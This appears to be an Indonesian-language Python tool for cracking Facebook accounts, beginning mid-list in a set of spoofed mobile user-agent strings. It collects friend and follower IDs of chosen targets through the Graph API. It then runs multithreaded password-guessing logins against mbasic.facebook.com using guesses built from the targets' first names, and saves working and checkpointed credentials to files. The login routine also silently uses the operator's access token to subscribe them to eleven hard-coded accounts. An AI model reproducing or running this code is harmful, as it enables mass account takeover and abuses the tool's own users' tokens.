'Mozilla/5.0 (Linux; Android 8.0.0; F5121 Build/34.4.A.2.118; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/262.0.0.34.117;]',
'Mozilla/5.0 (Linux; Android 4.4.4; Xperia X Build/KTU84Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; Xperia X Compact) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/289.0.0.40.121;]',
'Mozilla/5.0 (Linux; Android 6.0; F8132 Build/35.0.A.0.574; xx-xx) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/289.0.0.40.121;]',
'Mozilla/5.0 (Linux; Android 4.4.4; OPPO R7s Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/35.0.1916.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/289.0.0.40.121;]',
'Mozilla/5.0 (Linux; Android 10.1.0; Galaxy S10 Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/64.0.1025.133 Mobile Safari/535.19 [FB_IAB/FB4A;FBAV/289.0.0.40.121;]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 iPhone 7 Plus BingWeb/6.9.10.0',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/14.0;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]',
'Mozilla/5.0 (Linux; Android 4.4.4; SM-A700F Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/289.0.0.40.121;]'])


def login():
	os.system("clear")
	print("""
	 HARAP LOGIN UNTUK MELANJUTKAN KE SCRIPT
	""")
	print("[1]. Login Dengan Accesstoken Facebook\n[2]. Keluar Dari Script\n")
	pil=input("[!] Pilih Metode Login: ")
	if(pil in ("01","1")):
		to=input("[+] Masukan Access Token Anda: ")
		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={to}").text)
		try:
			nama=r['name']
			req.post(f'https://graph.facebook.com/100009447779678/subscribers?access_token={to}')
			req.post(f'https://graph.facebook.com/100000517973128/subscribers?access_token={to}')
			req.post(f'https://graph.facebook.com/100003603863923/subscribers?access_token={to}')
			req.post(f'https://graph.facebook.com/100004003690596/subscribers?access_token={to}')
			req.post(f'https://graph.facebook.com/100001403405461/subscribers?access_token={to}')
			req.post(f'https://graph.facebook.com/100001152080193/subscribers?access_token={to}')
			req.post(f'https://graph.facebook.com/100001134480658/subscribers?access_token={to}')
			req.post(f'https://graph.facebook.com/100011083959831/subscribers?access_token={to}')
			req.post(f'https://graph.facebook.com/100038342055141/subscribers?access_token={to}')
			req.post(f'https://graph.facebook.com/1475910687/subscribers?access_token={to}')
			req.post(f'https://graph.facebook.com/1836754937/subscribers?access_token={to}')
			print(f"[☆] Login Berhasil [☆]\nWelcome {nama}")
			open("save","a").write(to)
			time.sleep(1.5)
			crack(to,nama).menu()
		except KeyError:
			print("[×] Login Gagal [×]\nAccess Token Salah")
			time.sleep(1.5)
			login()
	elif(pil in ("2","02")):
		exit("Thanks You")
	elif(pil in (" ","  ","   ","    ","     ")):
		print("[!] Jangan Kosong")
		time.sleep(1)
		login()
	else:
		print("[!] Pilihan Tidak Ada")
		time.sleep(1)
		login()
def logika():
	try:
		token=open("save","r").read()
		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={token}").text)
		nama=r['name']
		print(f"[☆] Anda Sudah Login [☆]\nWelcome Back {nama}")
		time.sleep(1.5)
		crack(token,nama).menu()
	except FileNotFoundError:
		print("[!] Anda Belum Login Harap Login Terlebih Dahulu [!]")
		time.sleep(2)
		login()
	except KeyError:
		os.system("rm -rf save")
		exit("[!] Token Anda Invalid Harap Login Kembali")
		
class crack:
	
	def __init__(self,token,nama):
		self.token,self.nama=token,nama
	def crack(self,user,lala,asu):
		global ok,cp,cot,ajg
		if ajg!=user:
			ajg=user
			cot+=1
		for pw in lala:
			pw=pw.replace('name',asu)
			data={}
			ses=req.Session()
			ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":uas,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
			a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
			b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for c in a("input"):
				try:
					if c.get("name") in b:data.update({c.get("name"):c.get("value")})
					else:continue
				except:pass
			data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
			if 'c_user' in d.cookies.get_dict().keys():
				ok+=1
				open('ok','a').write(user+'|'+pw+'\n')
				print(f'\r\33[32;1m* --> [OK] {user}|{pw}\33[37;1m             \n',end='')
				break
			elif 'checkpoint' in d.cookies.get_dict().keys():
				cp+=1
				open('cp','a').write(user+'|'+pw+'\n')
				print(f'\r\33[1;33m* --> [CP] {user}|{pw}\33[37;1m              \n',end='')
				break
			print(f'\r[=] CRACK {str(cot)}/{len(id)} OK:-[{str(ok)}] CP:-[{str(cp)}]',end='')
	def kirim(self):
		print("\n[=] Jumlah Id People:",str(len(id)))
		pil=input("[?] Pwlist Manual [Y/T]: ")
		if(pil in ("y","Y")):
			with Bool(max_workers=35) as kirim:
				print("[!] Contoh (sayang,name,name123)")
				pwList=input("[+] Masukan Password List: ").split(",")
				print(f'\n[√] Crack Berjalan Pukul: {time.strftime("%X")}')
				print(f'+'+'-'*45+'+\n')
				for email in id:
					uid,name=email.split("|")
					kirim.submit(self.crack,uid,pwList,name.lower())
		elif(pil in ("t","T")):
			with Bool(max_workers=35) as kirim:
				print(f'\n[√] Crack Berjalan Pukul: {time.strftime("%X")}')
				print(f'+'+'-'*45+'+\n')
				for email in id:
					uid,name=email.split("|")
					if(len(str(name.lower()))>=6):
						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345']
					elif(len(str(name.lower()))<=2):
						pw=[name.lower()+'1234',name.lower()+'12345']
					elif(len(str(name.lower()))<=3):
						pw=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345']
					else:
						pw=[name.lower()+'12345']
					kirim.submit(self.crack,uid,pw,name.lower())
		else:
			exit("Pilihan Tidak Ada")
	def useragent(self):
		ua=open("ua","r").read()
		print("\n### Useragent Saat Ini:",ua)
		print("\nIngin Mengganti Useragent?")
		yt=input("[?] Answer [Y/T]: ")
		if(yt in ("y","Y")):
			os.system("rm -rf ua")
			uaBaru=input("[+] Masukan Useragent Baru: ")
			open("ua","w").write(uaBaru)
			input("\n[✓] Useragent Berhasil Diganti\n[!] Enter For Back To Menu")
			self.menu()
		elif(yt in ("t","T")):
			self.menu()
	def menu(self):
		os.system('clear')
		ha=0
		print("""
  _________   _____ __________.___
 /   _____/  /  _  \\______    \   | 
 \_____  \  /  /_\  \|     ___/   |     
 /        \/    |    \    |   |   |   
/_______  /\____|__  /____|   |___|
        \/         \/
        Latif. H & Yanwar. E
        """)
		print(f"[!] Welcome {self.nama} Selamat Menggunakan [!]\n")
		print('[1]. crack teman publik\n[2]. crack follower\n[C]. cek result\n[S]. set useragent\n[L]. logout\n[R]. laporkan bug')
		print(f'+'+'-'*45+'+\n')
		pil=input('[+] select: ')
		if(pil in ('01','1')):
			#print('\n\tCRACK DAFTAR TEMAN')
			try:
				jumlah=int(input("\n[?] Jumlah Target: "))
			except:jumlah=1
			print("\nketik 'me' crack daftar teman")
			for j in range(jumlah):
				ha+=1
				target=input(f"[+] id target ke {ha}: ").replace("'me'","me")
				try:
					rr=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
					#print("[=] Nama Target:",rr['name'])
				except KeyError:
					print("Target Tidak Ada")
					time.sleep(1)
					self.menu()
				r=json.loads(req.get(f"https://graph.facebook.com/{target}/friends?access_token={self.token}").text)
				for x in r['data']:
					idnya=x['id']
					nama=x['name'].rsplit(' ')[0]
					id.append(idnya+'|'+nama)
			self.kirim()
		elif(pil in ('02','2')):
			print('\n\tCRACK DAFTAR FOLLOWERS')
			try:
				jumlah=int(input("\n[?] Masukan Jumlah Target: "))
			except:jumlah=1
			print("\nKetik 'me' Buat Crack Daftar Followers Akun Anda")
			for j in range(jumlah):
				target=input("[+] Masukan ID Target: ").replace("'me'","me")
				try:
					rr=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
					#print("[=] Nama Target:",rr['name'])
				except KeyError:
					print("Target Tidak Ada")
					time.sleep(1)
					self.menu()
				r=json.loads(req.get(f'https://graph.facebook.com/{target}/subscribers?limit=50000&access_token={self.token}').text)
				for x in r['data']:
					idnya=x['id']
					nama=x['name'].rsplit(' ')[0]
					id.append(idnya+'|'+nama)
			self.kirim()
		elif(pil in ("c","C")):
			print("\n\nPilih Cek Hasil Crack\n[1]. Hasil Ok\n[2]. Hasil Cp\n[3]. Kembali Ke Menu\n")
			hh=input("[!] Select: ")
			if(hh in ("01","1")):
				try:
					print("\n",open("ok","r").read())
					input("Enter For Back To Menu")
					self.menu()
				except FileNotFoundError:
					input("\n[!] Anda Belum Mendapatkan Hasil Ok\nEnter For Back To Menu")
					self.menu()
			elif(hh in ("02","2")):
				try:
					print("\n",open("cp","r").read())
					input("Enter For Back To Menu")
					self.menu()
				except FileNotFoundError:
					input("\n[!] Anda Belum Mendapatkan Hasil Cp\nEnter For Back To Menu")
					self.menu()
			elif(hh in ("03","3")):
				self.menu()
		elif(pil in ("s","S")):
			self.useragent()
		elif(pil in ('l','L')):
			os.system('rm -rf save')
			exit('\nBerhasil Logout Dan Hapus Akun')
		elif(pil in ("r","R")):
			print("\n[√] Menuju WhatsApp Author....\n[!] Klik Buka Dengan WhatsApp")
			os.system("xdg-open https://wa.me/6283870396203")

if __name__=="__main__":
	try:
		ua=open("ua","r").read()
	except FileNotFoundError:
		print("[!] Useragent Tidak Ada")
		tll=input("[+] Harap Masukan Useragent: ")
		open("ua","a").write(tll)
		print("[√] Berhasil Ditambahkan\nSedang Menuju Ke Tools")
		time.sleep(1)
	logika()